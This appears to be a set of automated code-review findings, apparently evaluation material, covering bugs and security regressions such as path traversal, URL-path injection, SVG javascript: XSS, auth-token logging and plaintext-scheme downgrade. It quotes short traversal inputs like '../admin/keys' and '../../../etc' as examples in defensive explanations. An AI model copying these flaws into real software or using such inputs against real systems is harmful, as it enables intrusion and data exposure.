findings.title: Blocking requests.get inside async fetch_plan_limits stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but calls the synchronous `requests.get`, which does not yield to the event loop. Every call blocks the entire loop — and therefore all other concurrent requests handled by this process — for the full duration of the billing call, up to the 5 second timeout. Since this is described as running during request handling, a slow or hung `billing.internal` will stall unrelated traffic rather than just this one request.

Use the async client already in use in this module, e.g. `response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)` with an `httpx.AsyncClient` passed in the same way `fetch_plan` does, and drop the `requests` import. If a sync client is unavoidable, run it via `asyncio.to_thread(...)`.

findings.title: Unescaped tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is placed directly into the URL path with an f-string and no percent-encoding or format validation. If the value originates from request data (a path/query parameter, header, or JWT claim that is not strictly validated), a caller can inject `/`, `..`, `?` or `#` and reach paths on `billing.internal` other than `/limits/<tenant>` — e.g. `tenant_id = "../admin/keys"` yields `https://billing.internal/limits/../admin/keys`, which many servers and proxies normalise. `?` or `#` can also truncate or append query state. The internal service is presumably reachable only from this app, so this turns the handler into a limited request-forgery primitive against it.

Fix: validate the identifier against an expected shape (e.g. UUID/integer) before use, or at minimum `urllib.parse.quote(str(tenant_id), safe="")`. The pre-existing `fetch_plan` on line 6 has the same shape, so a shared helper would cover both.

findings.title: No test covers fetch_plan_limits or its blocking-call behavior
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests.get`, which blocks the event loop for the duration of the HTTP call. No test file is included in this diff, so nothing would fail if this function silently stalls the event loop, times out, or if the response parsing (`response.json()`) breaks. Since fetch_plan (the sibling function) presumably has some existing test coverage using the async httpx client, this new function introduces an untested code path with different (blocking) semantics that a naive test mirroring fetch_plan's pattern would not catch unless it specifically asserts non-blocking behavior or mocks `requests.get`.

findings.title: Bare `except:` swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` raised while `_client.send` is in flight are converted into a silent `return None`. That makes the process unkillable at this point via Ctrl-C and can break interpreter/worker shutdown. It also swallows genuine programming errors (`NameError`, `AttributeError`, a mis-typed payload) so a broken metrics client looks like a successful no-op forever.

The PR description says "catch and log", but no logging happens — the failure leaves no trace at all. Narrow the clause to `except Exception as exc:` and emit a log record (e.g. `logger.warning("metrics push failed", exc_info=exc)`) before returning.

findings.title: No test verifies push_metrics tolerates send() exceptions
findings.body: The change makes push_metrics catch all exceptions from _client.send and return None instead of raising. There is no test in this diff exercising the failure path (e.g. asserting that push_metrics returns None and does not raise when _client.send throws), nor one confirming the success path still returns the client's result. If the bare except were removed or the swallow logic were broken (e.g. re-raising, or returning the wrong value), nothing would fail.

findings.title: try_consume races on _counters: limit can be exceeded and updates lost
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await` on line 18, and only then writes `current + cost` on line 19 — all outside `_lock`, which `consume` (lines 9-11) does take.

Two concrete failures follow:

1. Limit bypass: two concurrent `try_consume(tenant, cost)` calls both read the same `current`, both pass the check on line 16, and both commit, so the counter can reach `LIMIT + cost` (or more with N concurrent callers). The limit this function exists to enforce is not enforced.
2. Lost update: line 19 assigns an absolute value derived from the stale snapshot rather than incrementing. Any `consume()` that completes during the `await` on line 18 is overwritten and its cost silently discarded, so the counter can even go *backwards*.

Fix by doing the read, check and write inside the same critical section, and by incrementing rather than assigning a snapshot:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` on line 18 is standing in for real work, that work must happen either before the lock or after the counter is committed — not between the check and the act.

_Also raised by the security agent:_ try_consume bypasses _lock: rate limit can be exceeded by concurrent requests

findings.title: try_consume's race condition is untested and would pass any naive test
findings.body: try_consume reads current = _counters.get(tenant, 0) outside the lock, then awaits (line 18) before writing back, unlike consume which holds _lock for the whole read-modify-write. Under concurrent calls this allows two coroutines to both read the same current value and both succeed, letting combined cost exceed LIMIT — the exact race the module's existing lock was presumably designed to prevent. A single-caller test (call try_consume once, assert True/False) would pass without exercising this race at all, giving false confidence that the rate limiter is safe under concurrency.

findings.title: Return shape change breaks existing tuple-unpacking caller
findings.body: `lookup_user` now returns `{"name": ..., "email": ..., "tier": ...}` instead of the `(name, email)` tuple. The retrieved caller `reports/weekly.py:6` does `name, email = lookup_user(user_id)`. Unpacking a 3-key dict into two names raises `ValueError: too many values to unpack`; even a 2-key dict would silently bind the *keys* (strings), not the values, producing `"name <email>"` text. Either keep returning a tuple and add a separate richer accessor, or update every caller (starting with `reports/weekly.py`) in this same change to read `user["name"]` / `user["email"]`.

findings.title: Docstring still promises tuple, but function returns a dict
findings.body:
The docstring "Return (name, email) for a user." was left unchanged even though the function now returns `{"name":..., "email":..., "tier":...}` instead of a `(name, email)` tuple. A caller relying on the docstring (e.g. reports/weekly.py's `name, email = lookup_user(user_id)`) would reasonably expect tuple-unpacking to work, but it will now raise at runtime. Update the docstring to describe the dict shape and its keys.

_Also raised by the correctness agent:_ Docstring still declares the old (name, email) tuple contract

findings.title: No test catches lookup_user's breaking return-shape change
findings.body: lookup_user changed from returning a tuple (name, email) to returning a dict {name, email, tier}. The known caller reports/weekly.py:render_row does `name, email = lookup_user(user_id)`, which will now fail (unpacking a dict yields its keys, not the expected values) or raise depending on dict iteration. findings.title: WriteSettlement always returns nil after a failed insert
findings.body:
The `err` from `db.Exec` on line 15 is scoped to the `if` statement; after logging it goes out of scope. Lines 18-19 then declare a brand-new `var err error` (zero value `nil`) and return it, so `WriteSettlement` reports success on every path except validation failure. In an end-of-day batch this means a settlement row that failed to insert is counted as written — silent financial data loss, visible only in logs, with no retry or reconciliation triggered.

Return the actual error (or, if "log and continue" is genuinely intended at this level, make that explicit at the call site and have this function return the error so the caller can decide):

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

findings.title: WriteSettlement's error-swallowing behavior is completely untested
findings.body: WriteSettlement declares `var err error` and returns it unconditionally (line 18-19), so it always returns nil regardless of whether the insert on line 15 succeeded or failed — only a log line is emitted on failure. There is no test file in this diff, so nothing would fail if this function silently discarded every insert error. A test asserting that WriteSettlement returns a non-nil error when the underlying db.Exec fails (e.g. using a mock/stub DB) would catch this; right now nothing does.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that omits the argument shares the same list object. Line 10 appends to it and line 11 returns it, meaning the second call returns its own failures *plus* every failure from all previous calls, and the list grows without bound for the lifetime of the process. Callers that treat the return value as "the recipients that failed in this batch" will re-handle stale recipients.

Use `def send_with_retries(recipients, attempted=None):` and `attempted = [] if attempted is None else attempted` as the first statement (this mirrors the `extra_headers or {}` idiom already used on line 2).

_Also raised by the security agent:_ Shared mutable default leaks recipients across calls and grows unbounded

findings.title: Mutable default arg bug in send_with_retries is untested
findings.body: send_with_retries(recipients, attempted=[]) uses a mutable default list, which persists across calls and accumulates entries from prior invocations if `attempted` is not passed explicitly. No test exercises calling this function twice to catch the shared-state bug, and no test exists at all for this new function's behavior (success/failure accumulation, return value). Add a test that calls send_with_retries twice with different recipients and asserts the second call's result does not contain leftover entries from the first.

findings.title: Function name promises retries it doesn't perform
findings.body: `send_with_retries` dispatches each recipient exactly once (`_dispatch([recipient], {})` is called a single time per recipient) and simply records failures in `attempted`; there is no retry loop or re-dispatch of failed recipients. A caller reading the name would reasonably expect failed sends to be retried, but the function's actual contract is 'send once, collect failures' — closer to `send_and_collect_failures`. This mismatch between name and behavior could lead a caller to assume delivery guarantees that don't exist.

findings.title: Rounding comparison changed from >= to > inside a 'rename' PR
findings.body:
`calc_rounding` used `line.remainder_cents >= 0.5`; `compute_rounding` uses `> 0.5`. This is a behavioural change hidden in a PR advertised as a pure rename: a remainder of exactly 0.5 now rounds down to 0 instead of up to 1. Exactly-half remainders are common in billing (half-cent splits, even-split proration), so this will produce off-by-one-cent differences against previously issued invoices and against any reconciliation that reproduces the old result. If the rounding-mode change is intended, it should be a separate, documented commit with a test pinning the 0.5 boundary; otherwise restore `>=`.

_Also raised by the tests agent:_ Rounding boundary condition silently changed from >= to >

findings.title: Off-by-one in page_of_sorted drops last record of every page
findings.body: The slice `ordered[start : start + PAGE_SIZE - 1]` returns at most `PAGE_SIZE - 1` records. Because the next page starts at `(page + 1) * PAGE_SIZE`, the record at index `start + PAGE_SIZE - 1` is never returned by any page — so exactly one record per page is silently lost from the export. It also diverges from `page_of` on line 6, which correctly uses `start + PAGE_SIZE`, so callers that assume a full page (e.g. "fewer than PAGE_SIZE results means last page") will mis-detect termination and loop forever or stop early. Change the bound to `ordered[start : start + PAGE_SIZE]`.

findings.title: New page_of_sorted function has no test coverage
findings.body: page_of_sorted is new behavior (adds sorting plus pagination slicing with a different slice end than page_of) and no test exists for it in this diff. A test comparing its output against expected page contents (e.g., page size, boundary/last-page behavior) would have caught the apparent off-by-one in the slice `ordered[start : start + PAGE_SIZE - 1]`, which returns only PAGE_SIZE-1 records per page instead of PAGE_SIZE.

findings.title: Dropped None guard: .upper() on optional purchase_order raises
findings.body:
`Invoice.purchase_order` is annotated `str | None` and the model docstring says it is "only set for customers on invoicing terms, which is roughly one account in twenty". The removed `if invoice.purchase_order is not None:` guard was therefore not redundant — it was the guard for the *majority* case. With it gone, `invoice.purchase_order.upper()` on line 4 raises `AttributeError: 'NoneType' object has no attribute 'upper'` for roughly 95% of invoices, so header rendering fails for nearly every invoice.

Restore the conditional append, or build the PO line only when the value is present, e.g.:

```python
def header_lines(invoice):
    lines = [f"Invoice {invoice.number}"]
    if invoice.purchase_order is not None:
        lines.append(f"PO {invoice.purchase_order.upper()}")
    return lines
```

findings.title: No test exercises header_lines with purchase_order=None
findings.body: The nil guard around `invoice.purchase_order` was removed, but there is no test in this PR (or apparently in the repo) that calls `header_lines` with an invoice whose `purchase_order` is None, which per the model docstring is the common case (~19/20 accounts). If this change is wrong, calling `.upper()` on None raises AttributeError, and nothing in the current test suite would surface that until it hits production for a non-PO account.

findings.title: File handle leaked when header validation fails
findings.body:
`read_validated` opens the file manually on line 10 but only closes it on the success path (line 16). When `header != expected_header` the function returns on line 14 with `fh` still open, so every rejected partner file leaks a descriptor — a batch importer processing many catalogues will eventually hit the process fd limit (and on CPython the handle only closes non-deterministically at GC; on PyPy it may never close before exit). Any exception raised by `next(reader)` or `list(reader)` leaks it too. Use `with open(path) as fh:` exactly as `read_rows` on line 5 already does, and put the whole body inside it.

_Also raised by the security agent:_ Early return on header mismatch leaks the open file handle

findings.title: No test covers read_validated's early-return/leak path
findings.body: The new read_validated function has a branch that returns early (line 14) without closing the file handle opened on line 10, and no test in this diff exercises either the mismatched-header path or the successful-validation path. A test asserting the file is closed (or not leaked) in the mismatch case, and a test checking correct rows are returned in the success case, would catch both the resource leak and any future regression in validation logic.

findings.title: Retry wraps non-idempotent charge call; duplicate charges possible
findings.body:
`charge_card` retries `billing.gateway.charge` up to 3 times, but `charge()` is documented as "NOT idempotent: each call creates a new charge." Any failure mode where the POST reaches the gateway but the response is lost (timeout, connection reset, 5xx after commit) will cause `retry` to re-issue the POST and create a second (or third) real charge for the same intent. This is money moving incorrectly, and the caller has no way to detect it.

The gateway already offers the fix: per its docstring it "supports an Idempotency-Key header; pass one to make retries safe." Either (a) thread a caller-supplied idempotency key through `charge_card` into `charge()` so all attempts collapse to one charge, or (b) drop the retry on this path and let the caller decide, retrying only after confirming via `get_charge` that no charge landed. `fetch_charge` (line 6-7) is fine because `get_charge` is explicitly "Safe to repeat" — the same wrapper is not safe here.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: New retry-wrapped charge_card has no test covering duplicate-charge risk
findings.body: charge_card wraps billing.gateway.charge with @retry(attempts=3), but charge() is explicitly documented as NOT idempotent (each call creates a new charge) unless an Idempotency-Key is passed, which is not done here. There is no test verifying that a transient failure followed by a retry does not result in multiple charges, or that an idempotency key is passed through. If this behavior is wrong (i.e., a retry causes a double charge), nothing in the current test suite would catch it.

findings.title: charge_card lacks docstring flagging non-idempotent retry risk
findings.body: billing.gateway.charge is documented as "NOT idempotent: each call creates a new charge" and recommends passing an Idempotency-Key for safe retries. The new charge_card function retries this exact call via @retry(attempts=3) but has no docstring, so a caller reading resilient.py sees it alongside fetch_charge (documented "Safe to repeat") and could reasonably assume charge_card is similarly safe to call/retry. A short docstring noting the duplicate-charge risk would prevent this contract from being invisible to callers of this module.

findings.title: Naive/aware datetime subtraction raises TypeError
findings.body: `datetime.now()` returns a naive datetime, but `Invite.expires_at` is documented as always tz-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every invite, not just an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does; `timezone` is already imported in this module.

findings.title: expires_within has no test, so its tz-naive/aware bug goes undetected
findings.body: expires_within is new and untested. It subtracts a tz-aware datetime (invite.expires_at, per models/invite.py) from a naive datetime.now(), which raises TypeError at runtime. No test exercises this function, so nothing in the suite would catch this before it hits production.

findings.title: expires_within returns True for already-expired invites
findings.body: For an invite whose `expires_at` is in the past, `delta.total_seconds()` is negative and the comparison is trivially true, so already-expired invites are reported as "expiring within N hours". If callers use this to pick invites to warn about or renew, they will also pick up dead ones. If that is intended, it is worth stating; otherwise bound the lower end (e.g. `0 <= delta.total_seconds() < hours * 3600`).

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body: `Account.billingContact` is declared optional in `web/src/types.ts` ("Absent until the customer completes onboarding"), and the sibling function on line 4 correctly uses `?.` with a fallback. `contactEmail` accesses `.email.toLowerCase()` directly, which throws `TypeError: Cannot read properties of undefined` for any account that has not completed onboarding — exactly the case the type documents. Either mirror the existing pattern (`account.billingContact?.email.toLowerCase() ?? ""`), change the return type to `string | undefined`, or take a narrowed input type that guarantees the contact is present. Note this should also be a compile error under `strictNullChecks`; if it is not, the PR's premise that "the account payload is always present" has been applied to the wrong field — the payload being present does not make `billingContact` present.

findings.title: contactEmail crashes on missing billingContact; uncovered
findings.body: The Account.billingContact field is documented as optional ("Absent until the customer completes onboarding"), yet contactEmail accesses account.billingContact.email directly without a null check, unlike bannerFor which uses optional chaining. If the PR's premise that billingContact is 'always present on this page' is wrong, this throws a TypeError, and nothing in the diff or repo exercises this function with an account lacking billingContact.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS and forwards it straight to `_transport.get(timeout_ms=timeout, ...)`. Passing `30` therefore gives the request a 30 ms budget (shared across the 3 default retries), not the generous timeout the PR description intends. Against a slow partner API this will fail on essentially every nightly run. Pass `timeout=30_000` (or a named constant such as `THIRTY_SECONDS_MS = 30_000`) to get the intended 30 seconds.

findings.title: No test covers sync_partner_catalogue's timeout units
findings.body: sync_partner_catalogue passes timeout=30 to fetch(), but fetch()'s docstring specifies timeout is in milliseconds. 30ms is almost certainly not the intended 30-second timeout described as 'generous' in the PR description. There is no test exercising this function, so this likely unit mismatch would not be caught by any test suite.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body:
Migration 0007 already created `invoices_tenant_created_idx ON invoices (tenant_id, created_at DESC)` \u2014 identical table, identical columns, identical sort order. The new `invoices_tenant_recent_idx` is a byte-for-byte duplicate under a different name. `IF NOT EXISTS` matches on the index *name*, not the definition, so it will not suppress the creation: Postgres will happily build and maintain a second copy. The cost is doubled storage on a presumably large table plus write amplification on every invoice insert/update, for zero query benefit \u2014 the planner will only ever use one of them.

Drop this statement; the reporting query the PR describes (filter by tenant, sort by recency) is already fully served by the 0007 index.

findings.title: priority=9 deprioritises reset mail; the scale is inverted
findings.body:
`enqueue`'s docstring states the priority argument is an ordering index where **0 is drained first and 9 is drained last** — "A job at 9 waits behind every other job on the queue." Passing `priority=9` therefore achieves the exact opposite of the PR's stated goal: password-reset mail now waits behind the nightly digest batch *and* everything else, whereas the previous implicit default of `5` at least put it mid-queue. This is a user-visible regression — reset links will be delivered later than before, and the digest batch this PR was meant to jump ahead of will now always win. Use a low index instead, e.g. `enqueue(ResetEmail(user, token), priority=0)` (or `1` if `0` is reserved for something more urgent).

_Also raised by the security agent:_ priority=9 drains last — reset mail now queues behind everything

_Also raised by the tests agent:_ priority=9 sends reset email last, not first

findings.title: No test verifies reset emails are actually queued ahead of digests
findings.body: There is no test in this diff (or apparently in the repo, based on what's shown) that asserts the resulting queue ordering after send_reset_email runs — e.g. comparing the position/priority of the reset job against a digest job. As written, a test that only checks enqueue was called with priority=9 would pass even though this is the wrong end of the queue, since nothing here validates against the actual draining semantics in queue/priority.py.

findings.title: upsert called with un-normalised title terms; titles silently unfindable
findings.body:
`upsert` explicitly requires its `terms` argument to be already lower-cased and de-duplicated, and states that it performs no normalisation itself: a term differing only by case creates a separate posting list that lower-casing queries will never hit. `article.title.split()` yields the title's raw tokens, which for any normally capitalised title ("Quarterly Report") will be mixed case. The publish call succeeds, the article appears indexed, and it is silently unfindable by those terms — the exact failure the docstring warns about.

Normalise at the call site before passing, e.g. `upsert(article.id, {t.lower() for t in article.title.split()})`.

findings.title: No test exercises publish()'s new indexing behaviour
findings.body: publish() now calls upsert(article.id, article.title.split()), which passes raw, non-lowercased title words into an index whose contract explicitly requires pre-normalised terms (search/index.py docstring: 'terms must already be lower-cased and de-duplicated ... upsert does not normalise them'). There is no test in this diff verifying that a published article becomes findable via search, e.g. asserting that querying by a lower-cased term returns the article. If the normalisation requirement is violated (as it appears to be here), nothing in the test suite would catch it — the bug would only surface as silently unfindable articles in production.

findings.title: Referer header now logged unscrubbed, leaking auth token into logs
findings.body:
The removed branch specifically sanitised the `Referer` value via `_scrub_uri(value, extra_param_keys)` before it was serialised into the log line. `jupyter_server/auth/identity.py` builds notebook URLs as `f"{base}?token={token}"`, and browsers echo that full URL — token query parameter included — in the `Referer` header of every subresource request. With the scrubbing gone, line 5 copies the raw header straight into `headers`, and line 6 `json.dumps`es it into the log, so any 5xx triggered while a tokenised page is open writes a live credential into the log file (and into anything shipping those logs off-box). Restore the `Referer`-specific `_scrub_uri` call, or scrub uniformly for all captured headers, before merging. Note also that dropping the only use of `extra_param_keys` likely leaves that parameter dead in this function's signature — check whether callers still pass it meaningfully.

_Also raised by the security agent:_ Auth token leaked into server logs via unscrubbed Referer header

findings.title: Removed Referer scrubbing has no accompanying test change
findings.body: The diff removes the `_scrub_uri` call that previously stripped sensitive query parameters (e.g. the auth token, per token_authenticated_url) from the Referer header before logging. This is a real behavior change: raw Referer values, which can carry the token query parameter, are now logged verbatim. No test file is included in this diff, so if there is an existing test asserting scrubbed output it would need updating (and its absence here is a sign this path isn't exercised); if there is no such test, this regression is silently uncovered. Add/update a test that asserts the logged Referer with a token query param is redacted.

findings.title: Dropping xlinkhref from URL validation re-enables SVG javascript: XSS
findings.body: `validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `javascript:`, `data:text/html` and `vbscript:` prefixes defined at the top of this file. After this change `xlinkhref` falls through to whatever the default return is, so a value like `` in submitted markdown is emitted unfiltered. `xlink:href` on `` (and on ``, which additionally allows same-document/remote fragment pulls) is script-executing in every major browser, so this is the exact sink the check existed for. Adversary: any user who can submit markdown content that another user renders. They control the full attribute value. They get script execution in the victim's origin — session theft, actions as the victim. If the goal is genuinely to shrink the attribute allowlist, `xlinkhref` must be *removed from the rendered-attribute allowlist* rather than removed from the scheme check — dropping it from the check while it is still rendered is strictly a weakening. Restore the `attribute === 'xlinkhref'` branch. _Also raised by the correctness agent:_ xlinkhref no longer validated, allowing javascript: URLs

findings.title: No test guards xlink:href sanitisation behaviour change
findings.body: The change removes 'xlinkhref' from the set of attributes routed through isAnchorLinkAllowed, meaning javascript:/data:text/html/vbscript: URIs in an xlink:href attribute would no longer be validated. No test file is included in this PR, so if this removal is a mistake (rather than an intentional narrowing), nothing in the suite would fail — the validateProp function would silently allow unsafe xlink:href values through.

findings.title: Removing ValidateID on project query param enables path traversal
findings.body:
`query.GetProjectQueryParam()` is taken straight from the HTTP request (the `project` query parameter of the list endpoint) and, after this change, is no longer checked by `common.ValidateID` before being used as a project identifier. The retrieved `internal/api/database/file/file.go` shows that `buildPath(project, kind)` performs `filepath.Join(d.Folder, project, kind)` and explicitly states "It does no validation of its own: callers are required to have validated the names before this point." `filepath.Join` runs `Clean`, so a value such as `../../../etc` collapses upward and escapes `d.Folder`, letting an unauthenticated-or-low-privileged API caller read/list documents outside the storage root (and, for projects the caller has no grant on, bypass project-scoped authorization since the name is no longer an identifier).

The PR description's claim that "the path join already scopes under the folder root" is incorrect for `filepath.Join`, which does not confine the result to its first argument. Restore the `common.ValidateID(projectQueryParameter)` check (or add equivalent containment in `buildPath`, e.g. reject names containing separators/`..` or verify the cleaned path is still prefixed by `d.Folder`).

Adversary: any client that can call the list endpoint. Controls: the `project` query string value. Gains: file access outside the intended project directory / cross-tenant data disclosure.

_Also raised by the correctness agent:_ Removing ValidateID lets a traversal project name escape the storage root

findings.title: No test guards removal of project name validation in list()
findings.body: The diff removes the common.ValidateID(projectQueryParameter) check that previously rejected malformed/malicious project identifiers before they reach buildPath (which explicitly documents that callers must validate names). No test in this change asserts that an invalid or path-traversal-style project query parameter (e.g. containing '..' or '/') is now accepted or rejected. If this removal is wrong, nothing would fail — there's no test exercising the list() function with an invalid projectQueryParameter to catch the regression.

findings.title: Equality check with path project no longer implies a valid identifier
findings.body: Line 4 only rejects the case where both a path project and a query project are present and differ. With validation gone, a request that supplies the *same* malformed value in both places (or supplies only the query parameter) passes this branch unchallenged, so the equality check no longer carries any implicit guarantee that the surviving value is a well-formed identifier. If the equality comparison was relied upon as a secondary sanity check, that assumption is now void.

findings.title: Buffer pre-reserved from unvalidated client Content-Length
findings.body:
`Reserve(contentLength)` commits memory up front based on a value the client controls (the part's `Content-Length` header), before a single byte of `body` has been read or verified. A request that declares a huge length and then sends an empty or truncated body causes the full reservation to be allocated anyway; the previous grow-as-you-read behaviour bounded the allocation by bytes actually delivered. Concurrent uploads multiply this, so a handful of cheap requests can exhaust the process heap.

Clamp the reservation to a sane ceiling (e.g. the configured maximum part size, or a fixed cap) and only reserve when `contentLength` is within it; let the RW grow naturally past that point. The `n, err := io.Copy(...)` result on line 8 should still be the authority for how much data actually arrived.

_Also raised by the security agent:_ Part buffer pre-allocated from client-declared Content-Length

findings.title: No test covers Reserve(contentLength) behavior change
findings.body: The change switches buffer allocation to pre-reserve based on contentLength via `multipart.NewRW().Reserve(contentLength)`. No test in this diff (or referenced) verifies that a large/mismatched contentLength is handled safely, that Reserve() actually pre-allocates capacity, or that behavior is correct when contentLength is unknown/negative. If Reserve() were removed, mis-implemented, or passed the wrong value, nothing in the visible change set would fail.

findings.title: Default scheme flips from https to http when is_secure is unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when the caller explicitly set `is_secure = False`; every other case, including the common one where `is_secure` is absent and `.get()` returns `None`, selected `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats `None` (and any other falsy value) as "not secure", so a request that never mentions `is_secure` is now sent over plaintext `http://` to `{bucket}.s3.amazonaws.com`, exposing the URL, path/query, and any auth headers on the wire.

If the intent really is a single ternary on truthiness, it must preserve the secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged), or `scheme = "https" if request.meta.get("is_secure", True) else "http"`. A regression test asserting that a request with empty `meta` yields an `https://` URL would pin this down.

_Also raised by the security agent:_ S3 requests default to plaintext http when is_secure meta is unset

findings.title: Non-boolean truthy/falsy values now change scheme selection
findings.body: Besides the missing-key case, the truthiness test changes behaviour for any non-boolean value a spider may place in `request.meta["is_secure"]`: `0`, `""`, `"false"`-like empty strings and empty containers now select `http`, while previously only the literal `False` did. A spider author who sets `is_secure` from configuration or an environment variable (a string or int) can therefore downgrade to plaintext without any explicit opt-out. The entry point for such a value is spider code, which is not shown in this diff or in retrieved context, so I cannot confirm any caller does this — hence the reduced confidence.

findings.title: No test exercises the changed default scheme behavior
findings.body: The change flips the default scheme when is_secure is unset/None from https to http (old: default https unless explicitly False; new: default http unless explicitly truthy). This is a security-relevant behavior change (this PR is filed under a plaintext-default CVE eval), but no test file is included in the diff to verify download_request picks the correct scheme for the unset/None/True/False cases of request.meta['is_secure']. If the logic were wrong, nothing here would fail.

findings.title: DELETE requests now authorized as "push", losing the delete action
findings.body:
The previous switch mapped `http.MethodDelete` to the `"delete"` action. The collapsed form only distinguishes GET/HEAD from everything else, so a DELETE request now produces `ResourceAction{Action: "push"}`. The access-policy model documented in `pkg/api/config/config.go` treats pull/push/delete as three distinct grants precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones". After this change every push-capable account can delete tags/manifests, and conversely a delete-only grant no longer authorizes DELETE at all. Restore the explicit `case http.MethodDelete: action = "delete"` branch (or an equivalent `if m == http.MethodDelete` before the push fallback).

_Also raised by the security agent:_ DELETE now authorises as "push", bypassing the delete permission

_Also raised by the tests agent:_ No test covers DELETE requests now mapping to "push" action

findings.title: Unknown methods (e.g. OPTIONS) now require push instead of defaulting to pull
findings.body: The old switch had an explicit `default: action = "pull"` for any method outside HEAD/GET/POST/PATCH/PUT/DELETE. The new condition inverts that default: anything that is not GET or HEAD falls into the `push` branch, so OPTIONS (CORS preflight) and any other verb now demand push access and will be rejected for pull-only clients. If the intent was to keep the permissive default, the condition should enumerate the write methods (POST/PATCH/PUT) rather than negating the read methods.

findings.title: Delete now maps to push, contradicting documented action model
findings.body: pkg/api/config/config.go documents that the three actions (pull/push/delete) are 'distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This diff removes the DELETE case entirely, so any non-GET/HEAD method (including DELETE) now maps to "push". The documented guarantee that push and delete permissions are separable is no longer true of the code's behavior.

findings.title: Size-limit eviction clears the whole cache, including the entry just written
findings.body:
`get_tenant_fresh` inserts `tenant` at line 10 and then, when the cache crosses 1000 entries, calls `_CACHE.clear()` at line 12. This drops every cached tenant — including the value just fetched on line 9 — so the write is immediately undone and every existing `get_tenant` caller starts missing until the cache refills. On a hot path that keeps the cache near the threshold, this degenerates into repeated full flushes (a stampede against `_fetch`) rather than bounded eviction.

If the intent is a size bound, evict a single entry (e.g. pop the oldest key, or use `functools.lru_cache`/`collections.OrderedDict` with `popitem(last=False)`) and do so *before* inserting the new value, so the freshly fetched tenant survives.

findings.title: No test for get_tenant_fresh's fetch/cache/clear behaviour
findings.body: get_tenant_fresh introduces new behaviour: it fetches fresh data, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is covered by a test in the diff. If _fetch's return value were not stored, if the cache write used the wrong key, or if the clear threshold/logic were off (e.g. off-by-one, or clearing before returning the tenant), nothing in the current change would catch it.

findings.title: get_tenant_fresh's cache-clearing side effect is undocumented
findings.body: get_tenant_fresh silently clears the entire shared _CACHE (affecting all tenants, not just the one requested) once it exceeds 1000 entries. Nothing in the name or a docstring signals this global side effect, so a caller reading the name would reasonably assume it only affects the single tenant_id being fetched. A short docstring or comment noting the eviction behavior would prevent surprise for other code relying on the cache's contents.

findings.title: README still documents removed `--workers` flag
findings.body:
The diff renames the CLI flag from `--workers` to `--concurrency` in cli.py, but README.md line 7 still reads '`--workers` — how many worker processes to start.' A user following the README would pass `--workers` and get an argparse error since the flag no longer exists. Update this line to `--concurrency`.

_Also raised by the correctness agent:_ README still documents `--workers` after the rename

findings.title: Flag rename breaks existing callers and `args.workers` accesses
findings.body: Renaming `--workers` to `--concurrency` changes two contracts at once: (1) any script, CI job or container entrypoint invoking the CLI with `--workers` now fails with `unrecognized arguments`, and (2) argparse derives the destination attribute from the option string, so every `args.workers` read elsewhere in the codebase becomes an `AttributeError` at runtime rather than a name error caught by tooling. Consider keeping the old spelling as a deprecated alias (`p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`) for a release, and confirm no consumer still reads `args.workers`.

findings.title: No test verifies the renamed --concurrency flag
findings.body: The flag was renamed from --workers to --concurrency, but no test file is included in this diff and no repository context confirms an existing test exercises parser() with this flag. If the rename were reverted or misspelled, nothing shown would fail. Add or update a test that calls parser().parse_args(['--concurrency', 'N']) and asserts the parsed value, and that --workers is no longer accepted.

findings.title: Docstring says integer total; function now returns a dict per day
findings.body: The docstring on line 2 states: "Return the total number of API calls this month as an integer." The implementation now returns a dict mapping day -> count (lines 3-4), not an integer total. A caller relying on the docstring would treat the return value as an int and break (e.g., arithmetic or formatting on the dict). Update the docstring to describe the new per-day breakdown return type.

findings.title: Return type changed from int to dict; docstring and callers not updated
findings.body: `monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and its docstring still promises "the total number of API calls this month as an integer". It now returns `{day: count}`. Any existing caller doing arithmetic or comparison on the result (`monthly_usage(a) > limit`, summing, formatting into a message) will silently misbehave or raise a `TypeError`. Either keep a scalar-returning function and add a separate `monthly_usage_by_day`, or update every caller and the docstring together.

findings.title: No test covers the new per-day dict return shape
findings.body: monthly_usage now returns a dict keyed by day instead of an int total, a breaking change to callers, but no test in this diff verifies the new shape or that GROUP BY day/count aggregation is correct. Any existing test asserting an integer return would either be missing or would need updating; nothing here confirms the change works or that callers were updated.

findings.title: Renaming `page_size` breaks any keyword-argument callers
findings.body: `page_size` was a public parameter name; any caller invoking `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: unexpected keyword argument 'page_size'`. No callers were retrieved for this review, so this needs verifying: either grep for `page_size=` across the repo and update every call site in this PR, or keep backwards compatibility (accept `page_size=None` and map it onto `limit` with a deprecation warning).

findings.title: No test guards the renamed pagination parameter
